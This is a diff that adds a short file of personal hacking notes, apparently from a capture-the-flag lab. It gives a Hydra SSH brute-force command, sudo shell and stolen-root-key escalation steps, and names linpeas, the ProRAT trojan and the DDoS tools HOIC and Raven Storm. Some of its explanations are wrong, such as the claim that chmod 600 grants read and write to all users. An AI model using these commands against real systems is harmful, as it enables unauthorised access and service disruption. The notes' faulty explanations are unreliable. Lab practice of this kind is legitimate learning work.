@@ -1,0 +1,59 @@
+Firefox ->preferences->proxy-> manual proxy setting, 127.0.0.1 8080 for the burpsuite
+
+Bruteforce password - Hydra.
+
+hydra -l <username> -P <full path to pass> 10.10.249.51 -t 4 ssh
+
+privelage escalation:
+
+ssh username@ip_addr -p port_number
+sudo -l
+
+sudo -u username /bin/bash
+
+ls -la: this command displays all the files
+
+root escalation:
+
+.ssh file
+
+id_rsa (private key)
+
+chmod 600 id_rsa :- this command gives read and write permission of the file to all user.
+
+ssh root@ip_addr -p port_number -i private_key file(id_rsa)
+
+exit -  this command is used to logout of the ssh
+
+ssh-keygen -f file_name := to generate the key pairs and put it in the authorised keys
+
+/bin/bash - gives the rool privilege
+
+cp /bin/bash greetings :- this will copy /bin/bash into a file greetings.
+
+./welcome -  runs the file
+
+
+
+/var/www/html
+
+The grep -nr command is used to search for text patterns in files within a directory and its subdirectories
+
+db_user
+
+cd /root
+
+wget or curl to download script from the github
+
+r- read, write - w, x - executable
+
+chmod +x filename :- to give the file excutable permision
+
+
+tools: - linenum, linpeas for privilege escalation
+
+
+prorat requires password
+
+
+DDOS - HOIC, RAVEN STORM
